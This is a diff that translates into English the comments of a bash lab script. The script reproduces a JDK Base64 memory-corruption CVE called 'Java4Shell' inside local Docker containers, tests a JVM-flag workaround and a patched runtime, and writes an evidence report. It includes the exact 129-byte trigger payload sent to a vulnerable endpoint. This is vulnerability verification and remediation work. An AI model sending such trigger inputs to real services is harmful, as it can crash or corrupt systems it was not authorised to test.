@@ -1,26 +1,26 @@
 #!/usr/bin/env bash
-# Roda o laboratorio completo em uma instancia x86-64 com AVX-512 VBMI.
-# Uso:  ./deploy/run-on-instance.sh
+# Runs the full lab on an x86-64 instance with AVX-512 VBMI.
+# Usage:  ./deploy/run-on-instance.sh
 #
-# Variaveis opcionais:
-#   JAVA_IMG=...        imagem base do alvo (default eclipse-temurin:17.0.6_10-jdk)
-#   PATCHED_IMAGE=...   imagem corrigida para o teste de remediação
+# Optional variables:
+#   JAVA_IMG=...        target base image (default eclipse-temurin:17.0.6_10-jdk)
+#   PATCHED_IMAGE=...   patched image for the remediation test
 #
-# Tudo escuta em 127.0.0.1. Nenhuma porta e exposta para fora da instancia.
+# Everything listens on 127.0.0.1. No port is exposed outside the instance.
 
 set -uo pipefail
 
 LAB="$(cd "$(dirname "$0")/.." && pwd)"
 cd "$LAB"
 
-# Em instancia recem-criada o usuario pode ainda nao estar no grupo docker.
-# Reexecuta como root se o acesso ao socket estiver negado.
+# On a freshly created instance the user may not be in the docker group yet.
+# Re-run as root if access to the socket is denied.
 if ! docker info >/dev/null 2>&1; then
   if sudo -n docker info >/dev/null 2>&1; then
     SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
     exec sudo -n "$SELF" "$@"
   fi
-  echo "docker inacessivel: rode 'newgrp docker' ou reconecte o SSH." >&2
+  echo "docker inaccessible: run 'newgrp docker' or reconnect SSH." >&2
   exit 1
 fi
 
@@ -51,7 +51,7 @@ wait_health() {
 }
 
 # ---------------------------------------------------------------------------
-say "1. Gate de hardware"
+say "1. Hardware gate"
 NEED=(avx512f avx512bw avx512vbmi bmi2)
 FLAGS="$(grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n')"
 MISSING=()
@@ -59,118 +59,118 @@ for f in "${NEED[@]}"; do grep -qx "$f" <<<"$FLAGS" || MISSING+=("$f"); done
 lscpu > "$EVID/lscpu.txt" 2>&1
 
 if [ ${#MISSING[@]} -ne 0 ]; then
-  note "CPU sem: ${MISSING[*]}"
-  note "ABORTANDO: esta instancia nao executa o codigo vulneravel."
+  note "CPU is missing: ${MISSING[*]}"
+  note "ABORTING: this instance does not execute the vulnerable code."
   {
-    echo "# Relatorio CVE-2026-114938"
+    echo "# CVE-2026-114938 report"
     echo
-    echo "Status: **INCONCLUSIVO** — instancia sem AVX-512 VBMI."
+    echo "Status: **INCONCLUSIVE** — instance without AVX-512 VBMI."
     echo
-    echo "Flags ausentes: ${MISSING[*]}"
+    echo "Missing flags: ${MISSING[*]}"
     echo
     echo '```'; head -20 "$EVID/lscpu.txt"; echo '```'
   } > "$EVID/report.md"
   exit 2
 fi
-note "OK: todos os flags presentes ($(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2- | xargs))"
+note "OK: all flags present ($(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2- | xargs))"
 
 # ---------------------------------------------------------------------------
-say "2. Ambiente"
+say "2. Environment"
 docker version --format 'docker {{.Server.Version}}' | rec
 "$LAB/deploy/_in_jdk.sh" "$JAVA_IMG" 'java -version 2>&1; java -XX:+PrintFlagsFinal -version 2>/dev/null | grep -E "UseAVX|UseBASE64Intrinsics"' \
   2>&1 | tee "$EVID/jdk.txt"
 
 # ---------------------------------------------------------------------------
-say "3. Build do alvo"
+say "3. Target build"
 docker build -q -t "$TARGET_IMG" ./target >/dev/null 2>&1
-if [ $? -ne 0 ]; then note "build falhou"; exit 1; fi
-note "imagem $TARGET_IMG pronta"
+if [ $? -ne 0 ]; then note "build failed"; exit 1; fi
+note "image $TARGET_IMG ready"
 
 # ---------------------------------------------------------------------------
-say "4. PoC bounded (seguro) no runtime vulneravel"
+say "4. Bounded PoC (safe) on the vulnerable runtime"
 down
 docker run --rm -v "$LAB/poc:/poc:ro" -w /poc "$JAVA_IMG" \
   sh -c 'javac -d /tmp/o Base64Trigger.java && java -cp /tmp/o Base64Trigger' \
-  2>&1 | tee "$EVID/poc-vulneravel.txt"
-if grep -q '^REPRODUCED' "$EVID/poc-vulneravel.txt"; then
-  note "corrupcao REPRODUZIDA (62 bytes alem do array)"
+  2>&1 | tee "$EVID/poc-vulnerable.txt"
+if grep -q '^REPRODUCED' "$EVID/poc-vulnerable.txt"; then
+  note "corruption REPRODUCED (62 bytes past the array)"
   BOUNDED="REPRODUCED"
 else
-  note "nao reproduziu neste runtime"
+  note "not reproduced on this runtime"
   BOUNDED="NOT REPRODUCED"
 fi
 
 # ---------------------------------------------------------------------------
-say "5. Trigger no caminho realistico (/decode, alocacao interna)"
+say "5. Trigger on the realistic path (/decode, internal allocation)"
 docker run -d --name "$NAME" -p "127.0.0.1:${PORT}:8080" \
   -e JAVA_OPTS="-XX:ErrorFile=/app/hs_err_%p.log" "$TARGET_IMG" >/dev/null
-if wait_health; then note "alvo no ar: $(curl -s "$BASE/health")"; else note "alvo nao subiu"; fi
+if wait_health; then note "target up: $(curl -s "$BASE/health")"; else note "target did not start"; fi
 
 VALID="$(python3 -c 'print("A"*64)')"
 TRIG="$(python3 -c 'import sys;sys.stdout.write("A"*128+"=")')"   # 129 bytes
 
-note "baseline valido -> $(curl -s -m 5 -X POST --data-binary "$VALID" "$BASE/decode-safe")"
+note "valid baseline -> $(curl -s -m 5 -X POST --data-binary "$VALID" "$BASE/decode-safe")"
 : > "$EVID/trigger.log"
-# um unico disparo: a primeira excecao desotimiza decode0
+# a single shot: the first exception deoptimizes decode0
 r="$(curl -s -m 30 -w '|http=%{http_code}' -X POST --data-binary "$TRIG" "$BASE/decode-exact")"
 echo "len=${#TRIG} -> $r" >> "$EVID/trigger.log"
 cat "$EVID/trigger.log" | tee -a "$EVID/session.log"
 
 STATE="$(docker inspect -f '{{.State.Status}} restarts={{.RestartCount}}' "$NAME" 2>/dev/null)"
-note "estado do container: $STATE"
+note "container state: $STATE"
 docker logs "$NAME" > "$EVID/container.log" 2>&1
 mkdir -p "$EVID/app"
 docker cp "$NAME:/app/." "$EVID/app/" >/dev/null 2>&1
-ls "$EVID/app" | grep -q 'hs_err' && note "hs_err capturado em $EVID/app"
+ls "$EVID/app" | grep -q 'hs_err' && note "hs_err captured in $EVID/app"
 
 # ---------------------------------------------------------------------------
 say "6. Workaround -XX:-UseBASE64Intrinsics"
 down
 docker run -d --name "$NAME" -p "127.0.0.1:${PORT}:8080" \
   -e JAVA_OPTS="-XX:-UseBASE64Intrinsics -XX:ErrorFile=/app/hs_err_%p.log" "$TARGET_IMG" >/dev/null
-wait_health && note "alvo no ar: $(curl -s "$BASE/health")"
+wait_health && note "target up: $(curl -s "$BASE/health")"
 curl -s -m 5 -X POST --data-binary "$VALID" "$BASE/decode-safe" > "$EVID/workaround.txt"
-echo " gatilho129 -> $(curl -s -m 30 -X POST --data-binary "$TRIG" "$BASE/decode-exact")" >> "$EVID/workaround.txt"
+echo " trigger129 -> $(curl -s -m 30 -X POST --data-binary "$TRIG" "$BASE/decode-exact")" >> "$EVID/workaround.txt"
 cat "$EVID/workaround.txt" | tee -a "$EVID/session.log"
 note "container: $(docker inspect -f '{{.State.Status}}' "$NAME")"
 
 # ---------------------------------------------------------------------------
 if [ -n "$PATCHED_IMAGE" ]; then
-  say "7. Remediacao: runtime corrigido ($PATCHED_IMAGE)"
+  say "7. Remediation: patched runtime ($PATCHED_IMAGE)"
   docker build -q --build-arg BASE_IMAGE="$PATCHED_IMAGE" -t "$PATCHED_TAG" ./target >/dev/null 2>&1
   docker run --rm -v "$LAB/poc:/poc:ro" -w /poc "$PATCHED_IMAGE" \
     sh -c 'javac -d /tmp/o Base64Trigger.java && java -cp /tmp/o Base64Trigger' \
-    2>&1 | tee "$EVID/poc-corrigido.txt"
-  grep -q '^REPRODUCED' "$EVID/poc-corrigido.txt" && PATCHED="AINDA VULNERAVEL" || PATCHED="corrigido"
-  note "resultado: $PATCHED"
+    2>&1 | tee "$EVID/poc-patched.txt"
+  grep -q '^REPRODUCED' "$EVID/poc-patched.txt" && PATCHED="STILL VULNERABLE" || PATCHED="fixed"
+  note "result: $PATCHED"
 else
-  PATCHED="nao testado (PATCHED_IMAGE nao definida)"
+  PATCHED="not tested (PATCHED_IMAGE not set)"
 fi
 
 # ---------------------------------------------------------------------------
-say "8. Relatorio"
+say "8. Report"
 down
 {
-  echo "# Relatorio CVE-2026-114938 (Java4Shell)"
+  echo "# CVE-2026-114938 (Java4Shell) report"
   echo
-  echo "- Data: $(date -Is)"
+  echo "- Date: $(date -Is)"
   echo "- Host: $(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2- | xargs)"
-  echo "- Runtime alvo: \`$JAVA_IMG\`"
-  echo "- Flags AVX-512: presentes"
+  echo "- Target runtime: \`$JAVA_IMG\`"
+  echo "- AVX-512 flags: present"
   echo
-  echo "## Resultado"
+  echo "## Result"
   echo
-  echo "| Teste | Resultado |"
+  echo "| Test | Result |"
   echo "|---|---|"
-  echo "| PoC bounded (vulneravel) | $BOUNDED |"
-  echo "| Container apos trigger | $STATE |"
+  echo "| Bounded PoC (vulnerable) | $BOUNDED |"
+  echo "| Container after trigger | $STATE |"
   echo "| Workaround \`-XX:-UseBASE64Intrinsics\` | $(tail -2 "$EVID/workaround.txt" | tr '\n' ' ') |"
-  echo "| Remediacao | $PATCHED |"
+  echo "| Remediation | $PATCHED |"
   echo
-  echo "## Evidencias"
+  echo "## Evidence"
   echo
   echo '```'
-  echo "--- poc-vulneravel.txt"; cat "$EVID/poc-vulneravel.txt"
+  echo "--- poc-vulnerable.txt"; cat "$EVID/poc-vulnerable.txt"
   echo "--- trigger.log"; cat "$EVID/trigger.log"
   echo "--- jdk.txt"; cat "$EVID/jdk.txt"
   echo '```'
@@ -182,5 +182,5 @@ down
   fi
 } > "$EVID/report.md"
 
-note "relatorio: $EVID/report.md"
-note "arquivos: $(ls "$EVID" | tr '\n' ' ')"
+note "report: $EVID/report.md"
+note "files: $(ls "$EVID" | tr '\n' ' ')"
